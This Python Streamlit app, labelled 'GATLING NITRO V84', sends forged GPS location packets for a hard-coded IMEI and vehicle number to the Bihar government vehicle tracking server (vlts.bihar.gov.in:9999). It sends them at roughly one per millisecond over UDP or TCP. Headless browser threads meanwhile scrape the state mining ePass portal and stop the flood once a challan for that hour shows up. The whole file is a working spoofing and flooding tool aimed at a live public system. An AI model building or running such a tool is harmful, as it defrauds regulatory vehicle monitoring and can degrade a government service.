import streamlit as st
import threading
import socket
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
import os

# --- Page Configuration ---
st.set_page_config(page_title="GATLING NITRO V84", page_icon="🚀", layout="wide")

# --- CSS for Professional Look (Fixed for Python 3.14+) ---
st.markdown("""
    <style>
    .main { background-color: #050505; color: #00FF00; }
    div.stButton > button:first-child {
        background-color: #004400; color: white; border-radius: 5px; font-weight: bold; width: 100%;
    }
    div.stMetric {
        background-color: #111; padding: 15px; border-radius: 10px; border: 1px solid #222;
    }
    </style>
    """, unsafe_allow_html=True)

st.title("🚀 VLTS GATLING NITRO - V84")
st.subheader("Enterprise Level Parallel Sync Engine")

# --- Session State Initializing ---
if 'firing' not in st.session_state:
    st.session_state.firing = False
if 'total_count' not in st.session_state:
    st.session_state.total_count = 0
if 'last_portal_update' not in st.session_state:
    st.session_state.last_portal_update = "Waiting..."

# --- Sidebar Configuration ---
with st.sidebar:
    st.header("⚙️ Settings")
    tag = st.text_input("TAG", "EGAS")
    imei = st.text_input("IMEI", "862567075041793")
    vno = st.text_input("VEHICLE NO", "BR04GA5974")
    lat = st.text_input("LATITUDE", "25.6501550")
    lon = st.text_input("LONGITUDE", "84.7851780")
    
    st.divider()
    mode = st.radio("PROTOCOL", ["UDP", "TCP"], horizontal=True)
    threads = st.slider("CHROME THREADS", 1, 10, 6)
    refresh_rate = st.slider("SCRAPE INTERVAL (SEC)", 3, 10, 5)

# --- Firing Packet Logic ---
def generate_packet():
    now = datetime.now()
    d, t = now.strftime("%d%m%Y"), now.strftime("%H%M%S")
    return f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{d},{t},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*"

# --- Firing Engine ---
def firing_engine():
    target = ("vlts.bihar.gov.in", 9999)
    p_bytes = generate_packet().encode('ascii')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if mode == "UDP" else socket.SOCK_STREAM)
    try:
        if mode == "TCP":
            sock.settimeout(5)
            sock.connect(target)
        while st.session_state.firing:
            if mode == "UDP": sock.sendto(p_bytes, target)
            else: sock.send(p_bytes)
            st.session_state.total_count += 1
            time.sleep(0.001)
    except:
        pass
    finally:
        sock.close()

# --- Scraper Engine ---
def scraper_engine():
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    
    # Check all possible Chrome paths on Streamlit Linux
    paths = ["/usr/bin/chromium", "/usr/bin/chromium-browser", "/usr/bin/google-chrome"]
    for path in paths:
        if os.path.exists(path):
            options.binary_location = path
            break

    try:
        driver = webdriver.Chrome(options=options)
        while st.session_state.firing:
            try:
                driver.get("https://khanansoft.bihar.gov.in/portal/ePass/ViewPassDetailsNew.aspx")
                time.sleep(2)
                driver.execute_script(f"document.getElementsByName('txtVehicleNo')[0].value = '{vno}';")
                driver.execute_script("__doPostBack('btnSearch','');")
                time.sleep(refresh_rate)
                
                res = driver.execute_script("""
                    var td = document.evaluate("//td[contains(text(), 'Challan Date')]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
                    return td ? td.nextElementSibling.nextElementSibling.innerText.trim() : null;
                """)
                
                if res:
                    st.session_state.last_portal_update = res
                    sys_now = datetime.now()
                    # Instant Kill Switch Logic
                    if sys_now.strftime("%d-%b-%Y").upper() in res.upper():
                        p_hour = res.split()[-1].split(':')[0]
                        if str(sys_now.hour).zfill(2) == p_hour:
                            st.session_state.firing = False
                            break
            except:
                pass
            if not st.session_state.firing: break
            time.sleep(2)
        driver.quit()
    except Exception as e:
        print(f"Scraper Error: {e}")

# --- Control Panel UI ---
col1, col2 = st.columns(2)

with col1:
    if st.button("🔥 START ENGINE", disabled=st.session_state.firing):
        st.session_state.firing = True
        st.session_state.total_count = 0
        threading.Thread(target=firing_engine, daemon=True).start()
        for i in range(threads):
            threading.Thread(target=scraper_engine, daemon=True).start()
        st.rerun()

with col2:
    if st.button("🛑 STOP & RESET"):
        st.session_state.firing = False
        st.session_state.total_count = 0
        st.session_state.last_portal_update = "IDLE (RESET)"
        st.rerun()

# --- Dashboard Display ---
st.divider()
m1, m2 = st.columns(2)
with m1:
    st.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
with m2:
    st.metric("Latest Portal Date", st.session_state.last_portal_update)

# Auto-refresh UI while firing
if st.session_state.firing:
    time.sleep(2)
    st.rerun()
